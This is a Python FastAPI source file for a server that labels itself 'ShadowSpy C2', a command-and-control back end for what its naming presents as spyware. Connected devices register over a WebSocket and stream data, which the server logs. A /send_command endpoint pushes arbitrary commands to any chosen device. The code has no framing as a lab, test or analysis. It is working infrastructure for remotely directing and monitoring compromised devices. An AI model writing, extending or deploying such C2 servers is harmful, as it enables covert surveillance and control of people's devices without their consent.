import asyncio
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import json

app = FastAPI(title="ShadowSpy C2 Local Server")

connected_clients = {}

@app.get("/")
async def home():
    return HTMLResponse("""<h1>ShadowSpy C2 - WebSocket Active</h1><p>Connect clients on /ws</p>""")

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    device_id = await websocket.receive_text()
    connected_clients[device_id] = websocket
    print(f"[+] Device connected: {device_id}")
    try:
        while True:
            data = await websocket.receive_text()
            print(f"[Device {device_id}] {data}")
            # Echo or process
    except WebSocketDisconnect:
        print(f"[-] Device disconnected: {device_id}")
        del connected_clients[device_id]

# Command sender example
@app.post("/send_command")
async def send_command(cmd: dict):
    device_id = cmd.get("device_id")
    command = cmd.get("command")
    if device_id in connected_clients:
        ws = connected_clients[device_id]
        await ws.send_text(json.dumps({"command": command}))
        return {"status": "sent"}
    return {"status": "device not connected"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=8000)